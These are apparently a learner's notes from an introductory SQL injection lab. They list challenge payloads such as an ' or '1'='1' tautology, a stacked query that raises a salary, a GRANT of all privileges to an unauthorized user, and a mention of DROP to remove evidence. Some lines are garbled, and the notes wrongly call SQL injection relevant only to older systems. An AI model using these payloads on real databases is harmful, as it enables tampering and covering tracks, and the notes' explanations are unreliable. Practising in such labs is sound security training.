## SQL Injection Intro - Notes ##
Date: 10/18/2025 : start time | 9:00am 

Challenge 1: [Regular Query] 
- Payload: SELECT department FROM employees WHERE first_name = 'Bob' ;
- Result: Pulled bobs department
- Why it worked: The query worked because there is no input validation and the query is functional

Challenge 2: [UPDATE]
- Payload: UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi ' ;
- Result: Changed Tobi's department
- Why it worked: The query worked because there is no input validation and the query was correct

Challenge 3: [ALTER]
- Payload: UALTER TABLE employees ADD phone VARCHAR(20)
- Result: Added a phone column to the table
- Why it worked: The query worked because there is no input valid- Payload: UPDATE employees SET department = 'Sales' WHERE first_n>

Challenge 4: [PERMISSION]
- Payload: GRANT ALL PRIVILEGES ON grant_rights TO unauthorized_user WITH GRANT OPTION;
- Result: It granted rights 
- Why it worked: The query worked because no input validation and query was structured correctly

#Note: SQL Injection seems worthless to go over since only older 
systems can fall victem to it. One thing I do wonder is how are 
Sql Injection attacks evolving? Is it loopholes iin websites bu-
ilt via AI or...?
#--------------------------------------------------------------

Challenge 5: [SQL QUERY]
- Payload: SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'
- Result: Success 
- Why it worked: Basically states select all from user data with
john and any last name or all data.

Challenge 6: [SQL QUERY]
- Payload: Login_Count = 0 , User_Id = TRUE
- Result: Success 
- Why it worked: No input validation and the query was soft

Challenge 7: [SQL Injection]
- Payload: '; UPDATE employees SET salary = 1000000 WHERE last_name = 'Smith';--
- Result: Success 
- Why it worked: No validation and good query 

Also used Update in a challenge to modify user salary and DROP-
to remove evidence.

## SQL Intro complete ##
